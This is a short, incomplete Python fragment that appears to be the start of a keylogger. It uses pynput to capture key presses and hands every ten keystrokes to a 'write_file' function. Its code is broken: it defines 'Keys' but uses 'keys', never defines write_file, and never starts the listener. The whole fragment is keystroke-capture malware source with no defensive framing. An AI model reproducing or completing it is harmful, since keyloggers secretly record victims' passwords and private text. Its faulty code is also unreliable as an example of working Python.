#import library
import pynput
from pynput.keyboard import Key, Listener


count = 0
Keys = []



def on_press(key):
    global keys, count

    keys.append (key)
    count += 1

    if count >= 10:
        count =0
        write_file(keys)
        keys = []

